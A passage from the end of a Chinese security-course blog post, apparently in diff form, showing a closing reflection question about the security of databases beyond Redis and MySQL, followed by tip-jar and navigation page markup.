+<p>在实际工作，除了Redis和MySQL，你还会用到哪些数据库？你可以思考一下，这些数据库有哪些安全事项呢？你可以按照我给出的表格，试着总结出相关的安全防护手段。</p>
+<p>欢迎留言和我分享你的思考和疑惑，也欢迎你把文章分享给你的朋友。我们下一讲再见！</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="reward-container">
+  <div>请我一杯咖啡吧！</div>
+  <button>
+    赞赏
+  </button>
+  <div class="post-reward">
+      <div>
+        <img src="/images/wechatpay.png" alt="zhaolq 微信">
+        <span>微信</span>
+      </div>
+      <div>
+        <img src="/images/alipay.png" alt="zhaolq 支付宝">
+        <span>支付宝</span>
+      </div>
+
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E6%8A%80%E8%83%BD30%E8%AE%B2/" rel="tag"># 安全攻防技能30讲</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/article/2023/09/15Linux%E7%B3%BB%E7%BB%9F%E5%92%8C%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8-Docker%E5%AE%89%E5%85%A8%EF%BC%9A%E5%9C%A8%E8%99%9A%E6%8B%9F%E7%9A%84%E7%8E%AF%E5%A2%83%E4%B8%AD%EF%BC%8C%E5%B0%B1%E4%B8%8D%E7%94%A8%E8%80%83%E8%99%91%E5%AE%89%E5%85%A8%E4%BA%86%E5%90%97%EF%BC%9F/" rel="prev" title="15Linux系统和应用安全-Docker安全：在虚拟的环境中，就不用考虑安全了吗？">
+                  <i class="fa fa-angle-left"></i> 15Linux系统和应用安全-Docker安全：在虚拟的环境中，就不用考虑安全了吗？
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/article/2023/09/17Linux%E7%B3%BB%E7%BB%9F%E5%92%8C%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8-%E5%88%86%E5%B8%83%E5%BC%8F%E5%AE%89%E5%85%A8%EF%BC%9A%E4%B8%8A%E7%99%BE%E4%B8%AA%E5%88%86%E5%B8%83%E5%BC%8F%E8%8A%82%E7%82%B9%EF%BC%8C%E4%B8%8D%E4%BC%9A%E5%87%BA%E7%8E%B0%E2%80%9C%E5%86%85%E5%A5%B8%E2%80%9D%E5%90%97%EF%BC%9F/" rel="next" title="17Linux系统和应用安全-分布式安全：上百个分布式节点，不会出现“内奸”吗？">
+                  17Linux系统和应用安全-分布式安全：上百个分布式节点，不会出现“内奸”吗？ <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 2019 – 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">zhaolq</span>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
